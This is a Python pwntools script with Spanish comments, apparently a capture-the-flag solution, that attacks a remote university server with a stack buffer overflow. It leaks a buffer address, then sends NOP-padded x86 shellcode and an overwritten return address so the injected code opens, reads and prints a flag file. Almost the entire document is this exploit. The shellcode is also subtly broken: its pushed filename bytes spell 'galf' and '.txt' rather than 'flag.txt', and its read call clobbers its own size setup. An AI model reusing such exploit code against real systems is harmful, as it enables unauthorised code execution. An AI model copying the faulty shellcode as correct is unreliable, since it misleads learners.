from pwn import *

HOST = "ic.catedras.linti.unlp.edu.ar"
PORT = 15009

con = remote(HOST, PORT, timeout=5)

try:
    # Recibir el prompt
    con.recvuntil(b"Ingrese su input:", timeout=3)
    
    # Estrategia: El programa solo lee input y imprime la dirección del buffer
    # No hay una función oculta que imprima la flag
    # La idea es que al hacer overflow y ejecutar shellcode, 
    # ese shellcode lea y imprima la flag
    
    # Shellcode que executa: system("cat flag.txt")
    # Pero eso requiere libc
    
    # Mejor: shellcode que lee directamente el archivo y lo escribe a stdout
    # open("flag.txt", O_RDONLY) -> read() -> write(1, buf, size)
    
    # Este shellcode abre, lee y escribe "flag.txt"
    # x86 32-bit
    shellcode = (
        # open("flag.txt", O_RDONLY)
        b"\x31\xc0"                     # xor eax, eax
        b"\x31\xdb"                     # xor ebx, ebx
        b"\x31\xc9"                     # xor ecx, ecx
        b"\x31\xd2"                     # xor edx, edx
        b"\x68\x2e\x74\x78\x74"         # push "txt."
        b"\x68\x67\x61\x6c\x66"         # push "flag"
        b"\x89\xe3"                     # mov ebx, esp
        b"\xb0\x05"                     # mov al, 5 (open)
        b"\xcd\x80"                     # int 0x80
        b"\x89\xc3"                     # mov ebx, eax (fd)
        # read(fd, buf, size)
        b"\x31\xc0"                     # xor eax, eax
        b"\x31\xc9"                     # xor ecx, ecx
        b"\xb1\x20"                     # mov cl, 32 (tamaño)
        b"\x31\xd2"                     # xor edx, edx
        b"\x31\xff"                     # xor edi, edi
        b"\x57"                         # push edi (puntero al buffer)
        b"\x89\xe1"                     # mov ecx, esp
        b"\xb0\x03"                     # mov al, 3 (read)
        b"\xcd\x80"                     # int 0x80
        # write(1, buf, eax)
        b"\x89\xc2"                     # mov edx, eax (size)
        b"\x31\xc0"                     # xor eax, eax
        b"\xb0\x04"                     # mov al, 4 (write)
        b"\x31\xdb"                     # xor ebx, ebx
        b"\xb3\x01"                     # mov bl, 1 (stdout)
        b"\xcd\x80"                     # int 0x80
        b"\xcc"                         # int 3 (breakpoint)
    )
    
    # El buffer tiene 64 bytes, EBP 4 bytes, luego EIP
    nop_count = 64 - len(shellcode)
    if nop_count < 0:
        # Si el shellcode es muy largo, usar solo los primeros bytes
        shellcode = shellcode[:64]
        nop_count = 0
    
    # El buffer comienza donde se envía el payload
    # Después de 64 + 4 bytes viene el EIP
    payload = b'\x90' * nop_count + shellcode + b'XXXX'
    
    # Para el EIP, usamos la dirección del buffer
    # Pero primero necesitamos la dirección
    # Hacemos reconocimiento: enviamos datos y vemos la dirección
    
    probe = b'A' * 10
    con.sendline(probe)
    respuesta = con.recvall(timeout=5)
    
    # Extraer dirección
    import re
    match = re.search(rb'0x([0-9a-f]+)', respuesta)
    if match:
        buffer_addr = int(match.group(1), 16)
        print(f"[+] Buffer address: 0x{buffer_addr:x}")
        
        # Reconectar y enviar payload final
        con2 = remote(HOST, PORT, timeout=5)
        con2.recvuntil(b"Ingrese su input:", timeout=3)
        
        # Payload: shellcode en el buffer + EIP que salte al buffer
        payload_final = shellcode + b'\x90' * (64 - len(shellcode)) + b'XXXX' + p32(buffer_addr)
        
        con2.sendline(payload_final)
        resultado = con2.recvall(timeout=10)
        print("[+] Resultado:")
        print(resultado.decode(errors="replace"))
        con2.close()
    
except Exception as e:
    print("Ocurrió:", type(e).__name__, e)
    import traceback
    traceback.print_exc()
finally:
    con.close()
